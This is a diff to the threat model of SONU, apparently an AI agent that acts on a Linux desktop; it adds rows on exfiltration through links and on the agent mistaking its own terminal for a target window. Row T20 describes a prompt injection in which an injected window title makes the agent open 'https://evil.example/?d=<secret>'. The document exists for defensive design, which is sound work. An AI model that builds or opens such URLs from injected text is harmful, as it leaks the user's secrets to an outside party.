@@ -1,7 +1,7 @@
 # SONU threat model
 
 - **Status:** living document — updated whenever a capability is added
-- **Last update:** 2026-09-24 (milestone M1)
+- **Last update:** 2026-09-25 (M1 fixes from real-desktop use: web tools, origin window)
 
 SONU is an agent that can act on the user's desktop. This document lists what we protect, who or what could cause
 harm, and how SONU's design reduces that harm. It is written to be checked: each mitigation says whether it exists
@@ -46,6 +46,8 @@ a command that runs directly.
 | T6 | Local abuse of SONU | Another process asks SONU to act | No network listener; daemon socket `0600` + `SO_PEERCRED` UID check | M2 |
 | T7 | Compositor stall | A buggy client freezes Hyprland | Requests ≤ 1000 bytes, single write + half-close, timeouts; verified against 0.56.2 source and tested | ✅ M0 |
 | T18 | Acting on the wrong window | A dispatcher without a selector acts on the *focused* window; an unmatched selector silently "succeeds" (both verified in the 0.56.2 source) | Every window action requires an exact `stableid:`/`address:` selector (enforced by types); results are verified on fresh snapshots, never inferred from "ok" | ✅ M1 |
+| T20 | Exfiltration through links | An injected title makes SONU open `https://evil.example/?d=<secret>` or search for private data | The model never builds URLs: `web.search` fills fixed templates for known sites and every query word must come from the user's request; `web.open` only opens a site the user named or a link they typed; only `http(s)` links, no `user:pass@` hosts; an eval case measures it | ✅ M1 |
+| T21 | Echoed request as evidence | The terminal running `sonu …` has the request as its title, so title matching picks it (seen on real hardware: "go to youtube" focused the terminal) | The window whose process is an ancestor of SONU's is identified deterministically and never counts as title evidence; the planner sees it as "the terminal SONU was started from", without its title | ✅ M1 |
 | T19 | Unattended approval | A keybind/menu run has no terminal to ask in | GUI yes/no dialog with "No" first; if no dialog program exists, risky steps are skipped (fail closed); there is no "approve all" flag | ✅ M1 |
 | T8 | Secrets in logs or prompts | API key written to a log or sent to a model | Keys only from keyring/env; logs and audit records pass through redaction; secrets never enter prompts | ✅ M0 (redaction), M5 (keyring) |
 | T9 | Silent history tampering | An audit line edited to hide an action | Hash-chained audit log, `sonu audit verify`; refuse to append to a damaged log. *Tamper-evident, not tamper-proof*: whoever can rewrite the file can rewrite the chain | ✅ M0 |
